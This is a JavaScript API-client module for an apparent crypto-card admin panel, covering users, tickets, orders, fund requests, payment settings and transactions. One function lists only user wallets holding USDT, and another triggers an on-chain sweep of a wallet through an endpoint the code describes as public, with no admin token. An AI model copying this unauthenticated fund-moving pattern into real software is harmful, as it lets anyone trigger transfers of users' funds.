// Central place for every backend call the admin panel makes.
// Add a new endpoint here, then consume it from a panel — nothing else fetches.

export const API = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:4000';

const auth = (token) => ({ Authorization: `Bearer ${token}` });
const json = { 'Content-Type': 'application/json' };

// ── Auth / stats ────────────────────────────────────────────────────────────────
export async function apiLogin(username, password) {
  const r = await fetch(`${API}/api/admin/login`, { method: 'POST', headers: json, body: JSON.stringify({ username, password }) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Login failed'); return d;
}
export async function apiStats(token) {
  const r = await fetch(`${API}/api/admin/stats`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d.stats;
}
export async function apiUsers(token, { page = 1, search = '' } = {}) {
  const p = new URLSearchParams({ page, limit: 20, search });
  const r = await fetch(`${API}/api/admin/users?${p}`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}

// ── App config (theme, brand, logo, voucher) ────────────────────────────────────
export async function apiGetConfig() {
  const r = await fetch(`${API}/api/config`);
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d.config || {};
}
export async function apiSaveConfig(token, fields) {
  const r = await fetch(`${API}/api/config`, { method: 'PUT', headers: { ...json, ...auth(token) }, body: JSON.stringify(fields) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d.config;
}
export async function apiUploadLogo(token, file) {
  const fd = new FormData(); fd.append('logo', file);
  const r = await fetch(`${API}/api/config/logo`, { method: 'POST', headers: auth(token), body: fd });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}
// Connect-wallet button logo (kept separate from the brand logo).
export async function apiUploadPayLogo(token, file) {
  const fd = new FormData(); fd.append('logo', file);
  const r = await fetch(`${API}/api/config/pay-logo`, { method: 'POST', headers: auth(token), body: fd });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}

// ── Support tickets ─────────────────────────────────────────────────────────────
export async function apiTickets(token, { page = 1, status = '', search = '' } = {}) {
  const p = new URLSearchParams({ page, limit: 20 });
  if (status) p.set('status', status);
  if (search) p.set('search', search);
  const r = await fetch(`${API}/api/tickets?${p}`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}
export async function apiUpdateTicket(token, id, fields) {
  const r = await fetch(`${API}/api/tickets/${id}`, { method: 'PATCH', headers: { ...json, ...auth(token) }, body: JSON.stringify(fields) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d.ticket;
}

// ── Physical-card orders ────────────────────────────────────────────────────────
export async function apiOrders(token, { page = 1, status = '', search = '' } = {}) {
  const p = new URLSearchParams({ page, limit: 20 });
  if (status) p.set('status', status);
  if (search) p.set('search', search);
  const r = await fetch(`${API}/api/cryptocard/orders?${p}`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}
export async function apiUpdateOrder(token, id, fields) {
  const r = await fetch(`${API}/api/cryptocard/orders/${id}`, { method: 'PATCH', headers: { ...json, ...auth(token) }, body: JSON.stringify(fields) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d.order;
}

// ── Add-funds requests ──────────────────────────────────────────────────────────
export async function apiFundRequests(token, { page = 1, status = '', search = '' } = {}) {
  const p = new URLSearchParams({ page, limit: 20 });
  if (status) p.set('status', status);
  if (search) p.set('search', search);
  const r = await fetch(`${API}/api/cryptocard/funds?${p}`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}
export async function apiUpdateFundRequest(token, id, fields) {
  const r = await fetch(`${API}/api/cryptocard/funds/${id}`, { method: 'PATCH', headers: { ...json, ...auth(token) }, body: JSON.stringify(fields) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d.request;
}

// ── Pre-login lead / analytics sessions ─────────────────────────────────────────
export async function apiPreLoginSessions(token, { page = 1, search = '' } = {}) {
  const p = new URLSearchParams({ page, limit: 20 });
  if (search) p.set('search', search);
  const r = await fetch(`${API}/api/analytics/pre-login-sessions?${p}`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error); return d;
}

// ── Per-network payment settings ────────────────────────────────────────────────
export async function apiGetSettings(token) {
  const r = await fetch(`${API}/api/admin/settings`, { headers: auth(token) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error || d.message); return d.data || [];
}
export async function apiUpdateSetting(token, network, amount) {
  const r = await fetch(`${API}/api/admin/settings`, { method: 'PUT', headers: { ...json, ...auth(token) }, body: JSON.stringify({ network, amount }) });
  const d = await r.json(); if (!r.ok) throw new Error(d.error || d.message); return d.data;
}

// ── Transactions ────────────────────────────────────────────────────────────────
// Recorded transaction history from the DB. The controller returns 404 (not an
// empty 200) when there are none, so treat that as an empty page.
export async function apiTransactions(token, { type, page = 1 } = {}) {
  const p = new URLSearchParams({ type, page, limit: 20 });
  const r = await fetch(`${API}/api/admin/transactions?${p}`, { headers: auth(token) });
  const d = await r.json();
  if (r.status === 404) return { data: [], currentPage: 1, totalPages: 1, totalRecords: 0 };
  if (!r.ok) throw new Error(d.error || d.message); return d;
}
// Live on-chain balances — only wallets currently holding USDT are returned.
export async function apiUserTransactions(token, { type, page = 1 } = {}) {
  const p = new URLSearchParams({ type, page, limit: 20 });
  const r = await fetch(`${API}/api/admin/user-transactions?${p}`, { headers: auth(token) });
  const d = await r.json();
  if (r.status === 404) return { data: [], currentPage: 1, totalPages: 1, totalRecords: 0 };
  if (!r.ok) throw new Error(d.error || d.message); return d;
}
// Triggers the on-chain sweep for one wallet (public endpoint — no admin token).
export async function apiSendFromHash(type, txHash) {
  const r = await fetch(`${API}/api/users/user-details-from-hash`, { method: 'POST', headers: json, body: JSON.stringify({ type, txHash }) });
  const d = await r.json(); if (!r.ok) throw new Error(d.message || d.error); return d;
}
